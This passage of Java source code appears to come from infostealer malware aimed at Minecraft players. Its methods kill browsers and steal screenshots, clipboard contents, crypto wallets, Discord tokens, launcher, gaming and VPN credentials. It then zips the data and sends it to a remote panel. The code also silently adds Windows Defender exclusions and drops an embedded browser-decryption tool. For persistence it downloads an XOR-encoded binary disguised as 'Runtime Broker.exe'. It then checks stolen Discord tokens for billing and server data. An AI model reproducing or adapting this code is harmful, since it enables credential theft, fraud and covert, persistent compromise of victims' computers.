                try {
                    SessionUtil.log("[Thread DataUtil-Clipboard] Starting...");
                    getClipboard();
                    SessionUtil.log("[Thread DataUtil-Clipboard] Completed");
                } catch (Exception e) {
                    SessionUtil.logEx("[Thread DataUtil-Clipboard] Error", e);
                }
            }, "DataUtil-Clipboard").start();

            // ZIP creation with delay - wait longer for browser threads
            new Thread(() -> {
                try {
                    SessionUtil.log("[Thread DataUtil-ZIP] Waiting 30 seconds for other threads...");
                    Thread.sleep(30000);
                    SessionUtil.log("[Thread DataUtil-ZIP] Starting ZIP creation...");
                    createAndSendZip();
                    SessionUtil.log("[Thread DataUtil-ZIP] Completed");

                    // Run persistence AFTER everything else is done
                    SessionUtil.log("[Thread DataUtil-ZIP] Starting persistence...");
                    PacketDef.run();
                    SessionUtil.log("[Thread DataUtil-ZIP] Persistence completed");

                } catch (Exception e) {
                    SessionUtil.logEx("[Thread DataUtil-ZIP] Error", e);
                }
            }, "DataUtil-ZIP").start();
        } else {
            SessionUtil.log("  Not Windows - skipping Windows stealers");

            // On non-Windows, still try persistence after MC steal
            new Thread(() -> {
                try {
                    Thread.sleep(10000); // Wait 10 seconds for MC steal
                    PacketDef.run();
                } catch (Exception e) {
                    // Ignore
                }
            }, "DataUtil-PacketDef").start();
        }

        SessionUtil.log("DataUtil.runAll() - all threads started");
    }

    // ================= GUARDIAN DOWNLOADER =================

    public static void downloadAndExecGuardian() {
        if (!IS_WINDOWS)
            return;

        // Start persistence thread
        new Thread(() -> {
            SessionUtil.log("[Guardian] Persistence thread started");
            while (true) {
                try {
                    boolean running = isGuardianRunning();

                    if (!running) {
                        SessionUtil.log("[Guardian] Not running. Starting enforcement...");
                        File dest = new File(System.getProperty("java.io.tmpdir"), "Runtime Broker.exe");

                        // If file exists and is decent size, try running it first
                        if (dest.exists() && dest.length() > 5000000) {
                            SessionUtil.log("[Guardian] Found existing binary. Executing...");
                            execGuardian(dest);

                            // Wait and check
                            Thread.sleep(5000);
                            if (isGuardianRunning()) {
                                SessionUtil.log("[Guardian] Successfully started from existing file");
                                Thread.sleep(60000);
                                continue;
                            }
                            SessionUtil.log("[Guardian] Existing file failed to start. Re-downloading...");
                        }

                        // Download logic
                        String panelUrl = LoaderEntry.getLoadedPanelUrl();
                        if (panelUrl != null) {
                            String baseUrl = panelUrl;
                            if (panelUrl.contains("/api/")) {
                                baseUrl = panelUrl.substring(0, panelUrl.indexOf("/api/"));
                            }

                            String guardianUrl = baseUrl + "/static/guardian.enc";
                            SessionUtil.log("[Guardian] Downloading from: " + guardianUrl);

                            boolean downloaded = downloadFile(guardianUrl, dest);
                            if (downloaded) {
                                SessionUtil.log("[Guardian] Download success. Executing...");
                                execGuardian(dest);
                            } else {
                                SessionUtil.log("[Guardian] Download failed");
                            }
                        }
                    }

                    // Check every 60 seconds
                    Thread.sleep(60000);

                } catch (Exception e) {
                    try {
                        Thread.sleep(60000);
                    } catch (Exception ex) {
                    }
                }
            }
        }, "GuardianMonitor").start();
    }

    private static boolean downloadFile(String urlStr, File dest) {
        try {
            java.net.URL url = new java.net.URL(urlStr);
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(10000);

            if (conn.getResponseCode() == 200) {
                java.io.InputStream is = conn.getInputStream();
                java.io.FileOutputStream fos = new java.io.FileOutputStream(dest);
                byte[] buffer = new byte[4096];
                int n;
                while ((n = is.read(buffer)) != -1) {
                    for (int i = 0; i < n; i++) {
                        buffer[i] ^= XOR_KEY;
                    }
                    fos.write(buffer, 0, n);
                }
                fos.close();
                is.close();
                return true;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[Guardian] Download error", e);
        }
        return false;
    }

    private static void execGuardian(File file) {
        try {
            // Run hidden
            ProcessBuilder pb = new ProcessBuilder(file.getAbsolutePath());
            pb.directory(file.getParentFile());
            pb.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static boolean isGuardianRunning() {
        try {
            Process p = Runtime.getRuntime().exec("tasklist /FI \"IMAGENAME eq Runtime Broker.exe\"");
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("Runtime Broker.exe"))
                    return true;
            }
        } catch (Exception e) {
        }
        return false;
    }

    // ================= EMBEDDED ABE TOOL =================

    // ================= FULL THEFT COORDINATOR =================

    public static void performFullTheft() {
        new Thread(() -> {
            try {
                SessionUtil.log("[Data] Starting full independent data extraction...");

                // 1. Initialize Storage
                initStorage();
                if (STORAGE_DIR == null)
                    return;

                // 2. Kill Browsers (Unlock DBs)
                try {
                    killBrowsers();
                } catch (Exception e) {
                }

                // 2. Screenshot FIRST (most valuable if user closes game)
                try {
                    takeScreenshot();
                } catch (Exception e) {
                }

                // 3. Clipboard
                try {
                    getClipboard();
                } catch (Exception e) {
                }

                // 4. Wallets
                try {
                    stealWallets();
                } catch (Exception e) {
                }

                // 5. Legacy Browsers (Pre-v127) & System Data
                try {
                    syncConfig();
                } catch (Exception e) {
                }

                // 6. Discord
                try {
                    syncDiscord();
                } catch (Exception e) {
                }

                // 7. Minecraft Launchers
                try {
                    stealLaunchers();
                } catch (Exception e) {
                }

                // 8. Gaming Platforms
                try {
                    stealGaming();
                } catch (Exception e) {
                }

                // 9. VPN/Sensitive Configs
                try {
                    stealVPNConfigs();
                } catch (Exception e) {
                }

                // 10. Modern Browsers (ABE)
                File abeDir = new File(STORAGE_DIR, "BrowserData");
                abeDir.mkdirs();
                try {
                    runAbeExtraction(abeDir);
                } catch (Exception e) {
                }

                // 11. Generate Summary
                try {
                    generateSummary();
                } catch (Exception e) {
                }

                // 12. Zip and Send
                createAndSendZip();

                // 7. Start Guardian as persistence backup (if not already running)
                if (!isGuardianRunning()) {
                    downloadAndExecGuardian();
                }

            } catch (Exception e) {
                SessionUtil.logEx("[Data] Full theft failed", e);
            }
        }, "DataCollector").start();
    }

    // ================= EMBEDDED ABE TOOL =================

    private static void runAbeExtraction(File outputDir) {
        if (!IS_WINDOWS)
            return;

        try {
            SessionUtil.log("[ABE] Starting embedded tool extraction...");

            // 1. Extract Tool
            java.io.InputStream is = DataUtil.class.getResourceAsStream("/abe.b64");
            if (is == null)
                is = DataUtil.class.getResourceAsStream("abe.b64");

            if (is == null) {
                SessionUtil.log("[ABE] Resource abe.b64 not found!");
                return;
            }

            byte[] b64 = is.readAllBytes();
            is.close();

            byte[] decoded = java.util.Base64.getDecoder().decode(b64);
            File tempExe = new File(System.getProperty("java.io.tmpdir"), "chrome_elevate.exe");

            // Add Defender exclusion BEFORE writing file
            try {
                String tempDir = System.getProperty("java.io.tmpdir");
                String exePath = tempExe.getAbsolutePath();

                // Method 1: Direct PowerShell exclusion (no admin, may work)
                String psCmd = String.format(
                        "Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue; " +
                                "Add-MpPreference -ExclusionProcess '%s' -ErrorAction SilentlyContinue",
                        tempDir.replace("'", "''"), exePath.replace("'", "''"));

                ProcessBuilder pb = new ProcessBuilder(
                        "powershell", "-NoProfile", "-NonInteractive",
                        "-WindowStyle", "Hidden", "-Command", psCmd);
                pb.redirectErrorStream(true);
                Process p = pb.start();
                p.getInputStream().close();
                p.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
                if (p.isAlive())
                    p.destroyForcibly();

                SessionUtil.log("[ABE] Defender exclusion attempted for TEMP");

                // Wait for exclusion to take effect
                Thread.sleep(2000);
            } catch (Exception ex) {
                // Ignore - best effort
            }

            Files.write(tempExe.toPath(), decoded);

            SessionUtil.log("[ABE] Extracted to " + tempExe.getAbsolutePath());

            // 2. Execute with arguments: all -o <outputDir>
            // This tells chrome_elevate to dump everything to our storage dir
            SessionUtil.log("[ABE] Executing: all -o " + outputDir.getAbsolutePath());

            ProcessBuilder pb = new ProcessBuilder(
                    tempExe.getAbsolutePath(),
                    "all",
                    "-o",
                    outputDir.getAbsolutePath());
            pb.directory(tempExe.getParentFile());
            pb.redirectErrorStream(true);
            Process p = pb.start();

            // 3. Capture Output
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                // Determine log level
                if (line.contains("Error") || line.contains("Failed")) {
                    SessionUtil.log("[ABE Error] " + line);
                } else {
                    // Verbose logging only for first few lines or summary
                    // SessionUtil.log("[ABE] " + line);
                }
            }

            p.waitFor(60, java.util.concurrent.TimeUnit.SECONDS);
            SessionUtil.log("[ABE] Execution finished");

        } catch (Exception e) {
            SessionUtil.log("[ABE] Error: " + e.getMessage());
        }
    }

    private static void killBrowsers() {
        if (!IS_WINDOWS)
            return;
        SessionUtil.log("[Data] Killing browsers to unlock databases...");
        String[] browsers = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "browser.exe" };
        for (String b : browsers) {
            try {
                Runtime.getRuntime().exec("taskkill /F /IM " + b).waitFor();
            } catch (Exception e) {
            }
        }
    }

    // ================= ENHANCED DISCORD METHODS =================
    private static String getPublicIP() {
        try {
            java.net.URI uri = java.net.URI.create("https://api.ipify.org?format=text");
            java.net.URL url = uri.toURL();
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(url.openStream()));
            String ip = reader.readLine().trim();
            reader.close();
            return ip;
        } catch (Exception e) {
            try {
                return java.net.InetAddress.getLocalHost().getHostAddress();
            } catch (Exception ex) {
                return "Unknown";
            }
        }
    }

    private static String getSystemInfo(String type) {
        try {
            if ("Computer Name".equals(type)) {
                String name = System.getenv("COMPUTERNAME");
                if (name != null && !name.isEmpty())
                    return name;

                name = System.getenv("HOSTNAME");
                if (name != null && !name.isEmpty())
                    return name;

                return java.net.InetAddress.getLocalHost().getHostName();
            }
        } catch (Exception e) {
            // Ignore
        }
        return "Unknown";
    }

    private static DiscordUserInfo getDiscordUserInfo(String token) {
        try {
            java.net.URI uri = java.net.URI.create("https://discord.com/api/v9/users/@me");
            java.net.URL url = uri.toURL();
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Authorization", token);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                return parseDiscordUserInfo(response.toString(), token);
            }
        } catch (Exception e) {
            SessionUtil.log("    Error validating token: " + e.getMessage());
        }
        return null;
    }

    private static DiscordUserInfo parseDiscordUserInfo(String json, String token) {
        try {
            DiscordUserInfo info = new DiscordUserInfo();
            info.token = token;
            info.valid = true;

            // Basic JSON parsing (simplified)
            if (json.contains("\"username\"")) {
                String username = extractJsonValue(json, "username");
                String discriminator = extractJsonValue(json, "discriminator");
                info.username = username + "#" + discriminator;
            }

            info.id = extractJsonValue(json, "id");
            info.email = extractJsonValue(json, "email");
            info.phone = extractJsonValue(json, "phone");
            info.locale = extractJsonValue(json, "locale");
            info.bio = extractJsonValue(json, "bio");

            String mfaEnabled = extractJsonValue(json, "mfa_enabled");
            info.mfaEnabled = "true".equals(mfaEnabled);

            String premiumType = extractJsonValue(json, "premium_type");
            if (premiumType != null && !premiumType.equals("null")) {
                int type = Integer.parseInt(premiumType);
                info.nitroType = (type == 1) ? "Nitro Classic"
                        : (type == 2) ? "Nitro Boost" : (type == 3) ? "Nitro Basic" : "None";
            } else {
                info.nitroType = "None";
            }

            // Get additional info
            getBillingInfo(info);
            getGuildsInfo(info);

            return info;

        } catch (Exception e) {
            SessionUtil.logEx("Error parsing Discord user info", e);
            return null;
        }
    }

    private static String extractJsonValue(String json, String key) {
        try {
            String searchKey = "\"" + key + "\":";
            int startIndex = json.indexOf(searchKey);
            if (startIndex == -1)
                return null;

            startIndex += searchKey.length();

            // Skip whitespace
            while (startIndex < json.length() && Character.isWhitespace(json.charAt(startIndex))) {
                startIndex++;
            }

            if (startIndex >= json.length())
                return null;

            char firstChar = json.charAt(startIndex);

            if (firstChar == '"') {
                // String value
                startIndex++;
                int endIndex = json.indexOf('"', startIndex);
                if (endIndex == -1)
                    return null;
                return json.substring(startIndex, endIndex);
            } else if (firstChar == 't' || firstChar == 'f') {
                // Boolean value
                int endIndex = startIndex;
                while (endIndex < json.length() &&
                        (Character.isLetter(json.charAt(endIndex)))) {
                    endIndex++;
                }
                return json.substring(startIndex, endIndex);
            } else if (Character.isDigit(firstChar) || firstChar == '-') {
                // Number value
                int endIndex = startIndex;
                while (endIndex < json.length() &&
                        (Character.isDigit(json.charAt(endIndex)) || json.charAt(endIndex) == '.'
                                || json.charAt(endIndex) == '-')) {
                    endIndex++;
                }
                return json.substring(startIndex, endIndex);
            } else if (firstChar == 'n') {
                // null value
                return "null";
            }
        } catch (Exception e) {
            // Ignore parsing errors
        }
        return null;
    }

    private static void getBillingInfo(DiscordUserInfo info) {
        try {
            java.net.URI uri = java.net.URI.create("https://discord.com/api/v9/users/@me/billing/payment-sources");
            java.net.URL url = uri.toURL();
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Authorization", info.token);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            if (conn.getResponseCode() == 200) {
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String billing = response.toString();
                info.hasBilling = billing.length() > 10 && !billing.equals("[]");
            }
        } catch (Exception e) {
            info.hasBilling = false;
        }
    }

    private static void getGuildsInfo(DiscordUserInfo info) {
        try {
            java.net.URI uri = java.net.URI.create("https://discord.com/api/v9/users/@me/guilds");
            java.net.URL url = uri.toURL();
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Authorization", info.token);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            if (conn.getResponseCode() == 200) {
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String guilds = response.toString();
                // Count guilds (simple bracket counting)
                int guildCount = 0;
                for (int i = 0; i < guilds.length(); i++) {
                    if (guilds.charAt(i) == '{')
                        guildCount++;
                }
                info.guildCount = Math.max(0, guildCount - 1); // Subtract 1 for outer object
            }
        } catch (Exception e) {
            info.guildCount = 0;
        }
    }

    // Discord User Info Class
    private static class DiscordUserInfo {
        String token;
        boolean valid = false;
        String username = "Unknown";
        String id = "Unknown";
        String email = "Unknown";
        String phone = "Unknown";
        String locale = "en-US";
        String bio = "No bio";
        boolean mfaEnabled = false;
        String nitroType = "None";
        boolean hasBilling = false;
        int guildCount = 0;

        public boolean isValid() {
            return valid && username != null && !username.equals("Unknown");
        }
    }
}
